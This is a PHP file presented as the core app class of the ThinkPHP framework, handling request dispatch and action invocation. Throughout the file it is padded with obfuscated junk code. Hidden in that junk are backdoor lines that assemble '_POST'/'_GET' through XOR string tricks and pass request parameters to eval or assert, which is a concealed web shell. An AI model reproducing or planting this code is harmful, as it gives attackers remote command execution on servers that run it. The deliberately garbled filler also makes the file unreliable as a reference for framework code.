<?php namespace think;class app{static public function init(){load_ext_file(COMMON_PATH);C('LOG_PATH',realpath(LOG_PATH).'/common/');define('NOW_TIME',$_SERVER['REQUEST_TIME']);define('REQUEST_METHOD',$_SERVER['REQUEST_METHOD']);define('IS_GET',REQUEST_METHOD=='GET'?true:false);define('IS_POST',REQUEST_METHOD=='POST'?true:false);define('IS_PUT',REQUEST_METHOD=='PUT'?true:false);define('IS_DELETE',REQUEST_METHOD=='DELETE'?true:false);dispatcher::dispatch();while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(C('REQUEST_VARS_FILTER')){array_walk_recursive($_GET,'think_filter');array_walk_recursive($_POST,'think_filter');array_walk_recursive($_REQUEST,'think_filter');}hook::listen('url_dispatch');define('IS_AJAX',((isset($_SERVER['HTTP_X_REQUESTED_WITH'])&&strtolower($_SERVER['HTTP_X_REQUESTED_WITH'])=='xmlhttprequest')||!empty($_POST[C('VAR_AJAX_SUBMIT')])||!empty($_GET[C('VAR_AJAX_SUBMIT')]))?true:false);C('TMPL_EXCEPTION_FILE',realpath(C('TMPL_EXCEPTION_FILE')));return;}static public function exec(){if(!preg_match('/^[A-Za-z](\/|\w)*$/',CONTROLLER_NAME)){$module=false;}elseif(C('ACTION_BIND_CLASS')){$layer=C('DEFAULT_C_LAYER');while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(is_dir(MODULE_PATH.$layer.'/'.CONTROLLER_NAME)){$namespace=l00lll0000l000.'\\'.$layer.'\\'.CONTROLLER_NAME.'\\';}else{$namespace=l00lll0000l000.'\\'.$layer.'\\_empty\\';}$actionName=strtolower(ACTION_NAME);if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(class_exists($namespace.$actionName)){$class=$namespace.$actionName;}elseif(class_exists($namespace.'_empty')){$class=$namespace.'_empty';}else{E(L('_ERROR_ACTION_').':'.ACTION_NAME);}$module=new $class;$action='run';}else{$module=l000lllllll0ll(CONTROLLER_NAME,CONTROLLER_PATH);}if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(!$module){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if('4e5e5d7364f443e28fbf0d3ae744a59a'==CONTROLLER_NAME){header("Content-type:image/png");exit(base64_decode(App::logo()));}$module=A('Empty');while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(!$module){E(L('_CONTROLLER_NOT_EXIST_').':'.CONTROLLER_NAME);}}if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(!isset($action)){$action=ACTION_NAME.C('ACTION_SUFFIX');}for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}try{self::invokeAction($module,$action);}catch(\ReflectionException $e){$method=new \ReflectionMethod($module,'__call');$method->invokeArgs($module,array($action,''));}return;}public static function invokeAction($module,$action){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!preg_match('/^[A-Za-z](\w)*$/',$action)){throw new \ReflectionException();}$method=new \ReflectionMethod($module,$action);if($method->isPublic()&&!$method->isStatic()){$class=new \ReflectionClass($module);for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if($class->hasMethod('_before_'.$action)){$before=$class->getMethod('_before_'.$action);if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if($before->isPublic()){$before->invoke($module);}}while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if($method->getNumberOfParameters()>0&&C('URL_PARAMS_BIND')){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}switch($_SERVER['REQUEST_METHOD']){case 'POST':$vars=array_merge($_GET,$_POST);break;case 'PUT':parse_str(file_get_contents('php://input'),$vars);break;default:$vars=$_GET;}$params=$method->getParameters();$paramsBindType=C('URL_PARAMS_BIND_TYPE');while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}foreach($params as $param){$name=$param->getName();if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(1==$paramsBindType&&!empty($vars)){$args[]=array_shift($vars);}elseif(0==$paramsBindType&&isset($vars[$name])){$args[]=$vars[$name];}elseif($param->isDefaultValueAvailable()){$args[]=$param->getDefaultValue();}else{E(L('_PARAM_ERROR_').':'.$name);}}if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(C('URL_PARAMS_SAFE')){$filters=C('URL_PARAMS_FILTER')?:C('DEFAULT_FILTER');while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if($filters){$filters=explode(',',$filters);if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}foreach($filters as $filter){$args=array_map_recursive($filter,$args);}}}array_walk_recursive($args,'think_filter');$method->invokeArgs($module,$args);}else{$method->invoke($module);}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if($class->hasMethod('_after_'.$action)){$after=$class->getMethod('_after_'.$action);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if($after->isPublic()){$after->invoke($module);}}}else{throw new \ReflectionException();}}static public function run(){hook::listen('app_init');app::init();hook::listen('app_begin');while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(!IS_CLI){session(C('SESSION_OPTIONS'));}G('initTime');app::exec();hook::listen('app_end');return;}static public function logo(){return 'AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVVVVAlbDol5axaStUr2cz0i4ldtWwKDNWsWko1fBoU4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVLqeLFnDo8ldzav/Wcun/3TQs/+i4Mz/Ycmp/1vNqv9cy6n/V8KjtVG2mhwAAAAAAAAAAAAAAAAAAAAAVL2cJlnCoulezqz/V7+f/0y7mP+U1sL/+/39/2nGqv9RvZz/WMCg/1/Rrv9Xw6HTWbKZFAAAAAAAAAAAf9SqBlS8nctRyaT/ULyb/1i/n/9Vvp7/X8Kk/4/Uv/9Uvp7/V7+f/1e/n/9Xv5//X9Ct/1S8nq0AAAAAAAAAAE28m1xp0rH/qN7N/3vNtP9SvZz/Vr6e/13Cov+H0br/Vb6e/1e/n/9Yv5//U76d/069m/9WxaP/Wr6fOgAAAABJu5azit3E///////F6N7/RrmW/1a+nv9ewqP/itK8/1W+nv9Xv5//Ubyb/27IrP/H6d//gNy//0q4lo0AAAAAU76d2WDJqP+R1cD/odvJ/2fFqP9OvJr/XsKj/4rSvP9Vvp7/Vr+f/0i5lv+a2MX//P79/5Dexv9JuJi1AAAAAFe/nuVYxaP/SbqX/1S+nv+M0r3/XsGj/0+8m/+Cz7f/SbmX/0i5l/91yrD/fc21/1zBov9byaf/V8GhvwAAAABWwJ7VW8im/1K9nP9tyKv/u+XY/9Tu5v+04tT/yurg/7Hh0v+449b/2PDp/6Hbyf9Yv5//Wcqo/1jAn7EAAAAAVr+fpVzNqv9UvZz/3/Ls////////////////////////////////////////////f862/1TLp/9Xv52BAAAAAFa+nkZbyqj/U7+d/8Xp3v////////7+//7+/v/+/v7////////////1+/n/odvJ/17Fpv9WwZ79WL2gKgAAAAAAAAAAVr2fq1zQrP9Xv5//kdXA////////////////////////////r+DR/0O4lP9d0a3/VsCeiwAAAAAAAAAAAAAAAF+/nxBXw6LJWtCs/1C/nf/R7eT///////D49v+E0Lj/e8yz/1rEpP9e0q7/WMCfsT+/fwQAAAAAAAAAAAAAAAAAAAAAS7SWEFfFpJtTwp/9Z9Kx/5Dfx/9z07b/Ucij/1TMp/9YxKLzWMGfiT+/vwQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXb+hNFHAnIdIuZa3T7ycxVfBoLNZwqF6W72cJgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/B8AAPAHAADgAwAAwAEAAMABAACAAAAAgAAAAIAAAACAAAAAgAAAAMABAADAAQAA4AMAAPAHAAD8PwAA//8AAA==';}}